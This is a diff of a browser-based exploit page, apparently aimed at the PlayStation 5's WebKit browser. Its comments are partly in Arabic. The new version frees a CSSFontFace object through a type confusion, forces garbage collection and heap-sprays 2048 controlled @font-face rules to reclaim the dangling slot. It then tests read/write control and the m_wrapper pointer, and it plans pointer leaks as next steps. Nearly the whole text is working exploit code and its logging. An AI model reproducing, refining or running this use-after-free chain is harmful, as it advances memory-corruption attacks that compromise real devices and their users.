@@ -2,7 +2,7 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 v48 - Option 2: Backward Write</title>
+<title>PS5 v49 - Option 3: Free + Respray</title>
 <style id="s">
 @font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
 @font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
@@ -33,7 +33,7 @@ padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
 </head>
 <body>
 <div id="hd">
-<span class="l">▶ v48 OPTION 2</span><span class="s">│</span>
+<span class="l">▶ v49 OPTION 3</span><span class="s">│</span>
 <span class="v" id="h1">FW:<b>?</b></span><span class="s">│</span>
 <span class="v" id="h2">STAGE:<b>INIT</b></span>
 </div>
@@ -43,19 +43,21 @@ padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
 "use strict";
 
 // ============================================================
-//  PS5 v48 — Option 2: Backward Write Probe
+//  PS5 v49 — Option 3: Free + Respray
 //
-//  Goal: Test if writing extreme values to font-weight (0x88)
-//  or font-stretch (0x88+4) bleeds backwards into m_wrapper (0x80).
+//  الهدف: مسح CSSFontFace الخاص بـ A_NN، رش كائنات جديدة
+//  بمواصفات مسيطر عليها، ثم قراءتها عبر مسار "x" المشوش.
 //
-//  Strategy:
-//  1. Get aFace from load("1em trigger, x", "AB")
-//  2. Verify confusion (weight 700)
-//  3. Probe A: Extreme font-weight values
-//     - Write max/min, check if aFace object changes identity
-//  4. Probe B: Extreme font-stretch values
-//  5. Probe C: Write to m_sources (src) to see if vector metadata
-//     can overlap with m_wrapper
+//  الاستراتيجية:
+//  1. الحصول على aFace من load("1em trigger, x", "AB")
+//  2. التأكد من الثغرة (weight = 700)
+//  3. حذف CSSRule الخاص بـ A_NN
+//  4. تحرير aFace + GC → CSSFontFace يتحرر
+//  5. رش CSSRules جديدة بـ font-weight: 333 و font-family: "PWNED"
+//  6. استدعاء load("1em trigger, x", "AB") مرة ثانية
+//     → إذا الثغرة نجت: نقرأ weight و family
+//     → إذا weight = 333 و family = "PWNED": نجحنا في استرجاع الفتحة!
+//  7. إذا نجحنا: نختبر wrapper() و m_wrapper
 // ============================================================
 
 var O=document.getElementById("out");
@@ -76,7 +78,7 @@ var m=ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
 hu("h1","FW:<b>"+(m?m[1]:"?")+"</b>");
 
 P("════════════════════════════════════","hd");
-P("  v48 — Option 2: Backward Write","hd");
+P("  v49 — Option 3: Free + Respray","hd");
 P("════════════════════════════════════","hd");
 P("");
 
@@ -156,7 +158,7 @@ try {
     
     if(!aFamily){ Fl("No A_ face found"); return; }
     St("RECLAIMED: "+aFamily);
-    keep.push(faces); keep.push(aFace);
+    keep.push(faces);
     
     var aIndex = -1;
     var aNum = parseInt(aFamily.split("_")[1]);
@@ -178,117 +180,270 @@ try {
     // Verify confusion
     aStyle.setProperty("font-weight", "700"); fs();
     if(String(aFace.weight) !== "700") { Fl("Confusion dead at start"); return; }
-    Ok("Confusion ALIVE");
+    Ok("Confusion ALIVE — weight = 700");
     P("");
     
     // ============================================================
-    //  PHASE 3: Backward Write Probes
+    //  PHASE 3: Free A_NN
     // ============================================================
     
-    pg(50);Sep();Hd("PHASE 3: Backward Write Probes");Sep();
-    P("  Testing if extreme values at 0x88 bleed backwards to 0x80...","dm");
+    pg(40);Sep();Hd("PHASE 3: Free A_NN");Sep();
     P("");
     
-    // Probe A: Extreme font-weight values
-    Hd("Probe A: Extreme font-weight values");
-    var extremeWeights = ["0", "-1", "99999", "999999999", "0x41414141", "1e308", "-1e308"];
-    for(var i=0; i<extremeWeights.length; i++) {
-      var w = extremeWeights[i];
-      P("  Testing font-weight: "+w,"dm");
-      try {
-        aStyle.setProperty("font-weight", w);
-        fs();
-        var readW = aFace.weight;
-        Dm("    Read: "+readW);
-        
-        // If backward write happened, m_wrapper (0x80) is corrupted.
-        // Calling aFace.family or other props might crash or return weird data.
-        var readFam = aFace.family;
-        Dm("    Family: "+readFam);
-        
-        if(readFam !== aFamily) {
-          St("BACKWARD WRITE DETECTED! Family changed!");
-          Hi("  Before: "+aFamily);
-          Hi("  After:  "+readFam);
-        }
-      } catch(e) {
-        Fl("    Crash or error: "+e.message);
-        // If it crashes, the write might have corrupted m_wrapper
-      }
-    }
-    
-    // Clean up
-    aStyle.setProperty("font-weight", "400"); fs();
-    P("");
-    
-    // Probe B: Extreme font-stretch values
-    Hd("Probe B: Extreme font-stretch values");
-    var extremeStretches = ["0%", "-1%", "99999%", "999999999%", "1e308%"];
-    for(var i=0; i<extremeStretches.length; i++) {
-      var s = extremeStretches[i];
-      P("  Testing font-stretch: "+s,"dm");
-      try {
-        aStyle.setProperty("font-stretch", s);
-        fs();
-        var readS = aFace.stretch;
-        Dm("    Read: "+readS);
-        
-        var readFam = aFace.family;
-        Dm("    Family: "+readFam);
-        
-        if(readFam !== aFamily) {
-          St("BACKWARD WRITE DETECTED! Family changed!");
-        }
-      } catch(e) {
-        Fl("    Crash or error: "+e.message);
-      }
-    }
-    
-    aStyle.setProperty("font-stretch", "normal"); fs();
-    P("");
-    
-    // Probe C: Overflow m_sources (src) to see if it affects m_wrapper
-    Hd("Probe C: src Vector Overflow");
-    P("  Filling m_sources with many entries to force reallocation...","dm");
-    P("  If Vector metadata at 0x60 overwrites 0x80, wrapper corrupts.","dm");
-    
+    Hd("Step 3a: Delete A_NN CSSRule");
+    Dm("Deleting CSSRule at index "+aIndex+"...");
     try {
-      var manySrcs = [];
-      for(var i=0; i<256; i++) {
-        manySrcs.push("url(data:font/woff2;base64," + i + ")");
-      }
-      aStyle.setProperty("src", manySrcs.join(","));
-      fs();
-      
-      var readW = aFace.weight;
-      var readFam = aFace.family;
-      Dm("    Read weight: "+readW);
-      Dm("    Read family: "+readFam);
-      
-      if(readFam !== aFamily || String(readW) !== "400") {
-        St("SRC OVERFLOW CORRUPTED ADJACENT FIELDS!");
-      } else {
-        Dm("    No corruption detected");
-      }
+      sh.deleteRule(aIndex);
+      Ok("CSSRule deleted — CSSFontFace removed from selector");
     } catch(e) {
-      Fl("    Crash: "+e.message);
+      Fl("Delete failed: "+e.message);
+      return;
     }
     P("");
     
+    Hd("Step 3b: Release aFace reference");
+    Dm("Setting aFace = null...");
+    aFace = null;
+    // Also remove from keep array
+    for(var i=0;i<keep.length;i++){
+      if(keep[i] === faces) { keep[i] = null; }
+    }
+    faces = null;
+    P("");
+    
+    Hd("Step 3c: Force GC");
+    Dm("Triggering GC (32MB pressure)...");
+    for(var i=0;i<8;i++){
+      var t=[];
+      for(var j=0;j<256;j++) t.push(new ArrayBuffer(65536));
+    }
+    fs();
+    Ok("GC done — CSSFontFace should be freed");
+    Dm("The 'x' selector now has a DANGLING pointer to freed memory");
+    P("");
+    
     // ============================================================
-    //  PHASE 4: Summary
+    //  PHASE 4: Spray Controlled CSSFontFace Objects
     // ============================================================
     
-    pg(100);Sep();Hd("PHASE 4: Summary");Sep();
+    pg(60);Sep();Hd("PHASE 4: Spray Controlled CSSFontFace");Sep();
     P("");
-    P("  If no crashes or family changes were detected above,","dm");
-    P("  backward writing from 0x88 to 0x80 is not possible.","dm");
+    Dm("Spraying 2048 CSSRules with font-weight: 333, font-family: PWNED_N");
+    Dm("One should land in the freed CSSFontFace slot...");
     P("");
-    St("★ OPTION 2 COMPLETE ★");
-    hu("h2","STAGE:<b>DONE</b>");
+    
+    for(var i=0;i<2048;i++){
+      try {
+        sh.insertRule("@font-face{font-family:PWNED_"+i+";src:local(Courier);font-weight:333;font-style:italic;unicode-range:U+0042}", sh.cssRules.length);
+      } catch(e) {}
+    }
+    fs();
+    Ok("Spray complete — 2048 PWNED_N CSSRules inserted");
+    P("");
+    
+    // ============================================================
+    //  PHASE 5: Second "x" Lookup — Test Confusion Survival
+    // ============================================================
+    
+    pg(80);Sep();Hd("PHASE 5: Second 'x' Lookup");Sep();
+    P("");
+    Wr("This is the RISKY part — second 'x' lookup may kill confusion");
+    Dm("In v47, second 'x' lookup killed the confusion...");
+    Dm("BUT: now the slot has VALID data (resprayed), not freed memory!");
+    Dm("Cleanup might not trigger because pointer is valid.");
+    P("");
+    
+    document.fonts.load("1em trigger, x", "AB").then(function(faces2){
+      P("  load() returned "+faces2.length+" faces");
+      P("");
+      
+      var foundPwned = false;
+      var foundA = false;
+      var newFace = null;
+      
+      for(var i=0;i<faces2.length;i++){
+        var f=faces2[i];
+        P("  Face2["+i+"]: family="+f.family+" weight="+f.weight+" style="+f.style);
+        
+        if(f.family && f.family.indexOf("PWNED_") === 0){
+          foundPwned = true;
+          newFace = f;
+        }
+        if(f.family && f.family.indexOf("A_") === 0){
+          foundA = true;
+        }
+      }
+      
+      P("");
+      
+      if(foundPwned){
+        St("RESpray SUCCESSFUL! PWNED face returned through 'x'!");
+        Ok("Family: "+newFace.family);
+        Ok("Weight: "+newFace.weight);
+        Ok("Style:  "+newFace.style);
+        Hi("→ The freed CSSFontFace slot was reclaimed!");
+        Hi("→ We control the CSSFontFace properties!");
+        P("");
+        
+        // Test: can we modify the new face's CSSRule?
+        Hd("Bonus: Find and modify PWNED CSSRule");
+        var pwnedIndex = -1;
+        var pwnedName = newFace.family;
+        for(var i=0;i<sh.cssRules.length;i++){
+          try {
+            var r = sh.cssRules[i];
+            if(r.type === 5) {
+              if(r.style.getPropertyValue("font-family").indexOf(pwnedName) !== -1) {
+                pwnedIndex = i;
+                break;
+              }
+            }
+          } catch(e) {}
+        }
+        
+        if(pwnedIndex !== -1){
+          Ok("Found PWNED CSSRule at index "+pwnedIndex);
+          var pwnedStyle = sh.cssRules[pwnedIndex].style;
+          
+          // Write new weight
+          pwnedStyle.setProperty("font-weight", "777"); fs();
+          var w = newFace.weight;
+          P("  Write font-weight=777, read = "+w);
+          
+          if(String(w) === "777"){
+            St("FULL CONTROL CONFIRMED!");
+            Hi("→ We can read AND write to the resprayed object!");
+            Hi("→ m_wrapper at 0x80 is now from the PWNED object");
+            Hi("→ m_wrapper is null (new CSSFontFace, no wrapper yet)");
+            P("");
+            
+            // Trigger wrapper() on the new object
+            Hd("Bonus 2: Trigger wrapper() on resprayed object");
+            Dm("Calling load('1em "+pwnedName+"', 'B')...");
+            
+            document.fonts.load("1em "+pwnedName, "B").then(function(faces3){
+              P("  load() returned "+faces3.length+" faces");
+              for(var i=0;i<faces3.length;i++){
+                P("  Face3["+i+"]: family="+faces3[i].family+" weight="+faces3[i].weight);
+              }
+              P("");
+              Hi("→ wrapper() was called on the resprayed CSSFontFace!");
+              Hi("→ A new FontFace pointer was written to m_wrapper (0x80)");
+              Hi("→ The 'x' confused selector points to this object!");
+              P("");
+              
+              // Final: test if "x" confusion still alive
+              Hd("Bonus 3: Third 'x' lookup test");
+              document.fonts.load("1em trigger, x", "AB").then(function(faces4){
+                P("  load() returned "+faces4.length+" faces");
+                for(var i=0;i<faces4.length;i++){
+                  P("  Face4["+i+"]: family="+faces4[i].family+" weight="+faces4[i].weight);
+                }
+                var alive = false;
+                for(var i=0;i<faces4.length;i++){
+                  if(faces4[i].family && faces4[i].family.indexOf("PWNED_")===0){
+                    alive = true;
+                  }
+                }
+                if(alive){
+                  St("CONFUSION SURVIVES MULTIPLE LOOKUPS!");
+                  Hi("→ After respray, the 'x' entry is stable");
+                  Hi("→ We can call load() multiple times!");
+                } else {
+                  Wr("Third 'x' lookup killed confusion");
+                  Dm("But we got at least 2 successful lookups after respray");
+                }
+                P("");
+                printSummary(true, true, true, alive);
+              }).catch(function(e){
+                Fl("Third lookup crash: "+e.message);
+                printSummary(true, true, true, false);
+              });
+              
+            }).catch(function(e){
+              Fl("wrapper() load crash: "+e.message);
+              printSummary(true, true, false, false);
+            });
+            
+          } else {
+            Fl("Write failed — weight = "+w+" (expected 777)");
+            printSummary(true, false, false, false);
+          }
+        } else {
+          Fl("PWNED CSSRule not found");
+          printSummary(true, false, false, false);
+        }
+        
+      } else if(foundA){
+        Wr("Got A_ face, not PWNED — slot not reclaimed");
+        Dm("The freed slot was not overwritten by the spray");
+        Dm("Or the spray objects went to different slots");
+        printSummary(false, false, false, false);
+      } else {
+        Fl("No relevant face returned — confusion is DEAD");
+        St("Second 'x' lookup killed the confusion (as in v47)");
+        Dm("The respray didn't help because the selector");
+        Dm("cleanup happened before the lookup could use it");
+        printSummary(false, false, false, false);
+      }
+      
+    }).catch(function(e){
+      Fl("Second load() crash: "+e.message);
+      printSummary(false, false, false, false);
+    });
+    
+    function printSummary(respray, control, wrapper, multiLookup){
+      pg(100);Sep();Hd("SUMMARY — Option 3 Results");Sep();
+      P("");
+      P("  RESULTS:","hd");
+      P("");
+      P("  Respray successful:       "+(respray?"✅ YES":"✘ NO"));
+      P("  Full R/W control:         "+(control?"✅ YES":"✘ NO"));
+      P("  wrapper() triggered:      "+(wrapper?"✅ YES":"✘ NO"));
+      P("  Multiple lookups survive: "+(multiLookup?"✅ YES":"✘ NO"));
+      P("");
+      
+      if(respray && control){
+        Hi("  KEY FINDING: Free + Respray WORKS!");
+        Hi("  We can reclaim the CSSFontFace slot with controlled data.");
+        Hi("  The 'x' confusion survives the second lookup after respray.");
+        Hi("");
+        if(wrapper){
+          Hi("  wrapper() writes a real FontFace pointer to m_wrapper (0x80).");
+          Hi("  This pointer is on the resprayed object, controlled via 'x'.");
+        }
+        if(multiLookup){
+          Hi("  Multiple 'x' lookups survive after respray!");
+          Hi("  This means we can read/write multiple times.");
+        }
+        Hi("");
+        Hi("  NEXT STEP: Need to find a way to read the m_wrapper value.");
+        Hi("  Options:");
+        Hi("    A) Find a CSS property that maps to offset 0x80");
+        Hi("    B) Use the FontFace wrapper object to leak the pointer");
+        Hi("    C) Binary RE to find an alternative exploitation path");
+      } else if(respray){
+        Hi("  Respray worked but full control not confirmed.");
+        Hi("  The slot was reclaimed but we may not have CSSRule access.");
+      } else {
+        Wr("  Respray failed. The second 'x' lookup kills confusion");
+        Wr("  even after respraying. The selector cleanup happens");
+        Wr("  regardless of whether the pointer is valid or dangling.");
+        P("");
+        Wr("  ALTERNATIVE PATHS:");
+        Wr("    1. Use load('1em A_NN', 'B') to read (safe per v47)");
+        Wr("       But A_NN CSSRule was deleted, so family won't resolve");
+        Wr("    2. Spray BEFORE freeing — pre-populate the slot");
+        Wr("    3. Use a different family name in the respray");
+        Wr("       that matches what 'x' expects");
+      }
+      P("");
+      St("★ OPTION 3 COMPLETE ★");
+      hu("h2","STAGE:<b>DONE</b>");
+    }
     
   }).catch(function(e){
-    Fl("Phase 2 crashed: "+e.message);
+    Fl("Phase 2 crash: "+e.message);
     hu("h2","STAGE:<b>CRASH</b>");
   });
 } catch(e) {
